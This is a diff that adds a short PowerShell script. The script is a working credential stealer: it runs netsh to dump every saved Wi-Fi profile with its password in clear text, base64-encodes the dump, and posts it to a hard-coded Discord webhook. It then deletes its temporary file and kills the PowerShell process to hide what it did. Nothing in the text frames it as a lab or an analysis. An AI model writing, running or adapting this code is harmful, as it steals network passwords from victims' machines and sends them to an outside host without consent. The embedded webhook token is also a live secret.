@@ -1,0 +1,23 @@
+$file = "$env:USERPROFILE\WiFi_Password.txt"
+$webhookURL = "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+netsh wlan show profiles | `
+    Select-String "All User Profile" | `
+    ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | `
+    ForEach-Object { $_ -replace "\s+", "" } | `
+    ForEach-Object { netsh wlan show profile name=$_ key=clear } | `
+    Out-File -FilePath "$file" -Encoding UTF8
+$fileContent = Get-Content -Path $file -Raw
+$fileContentBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
+$boundary = [System.Guid]::NewGuid().ToString()
+$bodyLines = (
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"WiFi_Password.txt`"",
+    "Content-Type: application/octet-stream",
+    "",
+    $fileContentBase64,
+    "--$boundary--",
+    ""
+)
+Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ($bodyLines -join "`r`n")
+Remove-Item -Path $file -Force
+Stop-Process -Name powershell
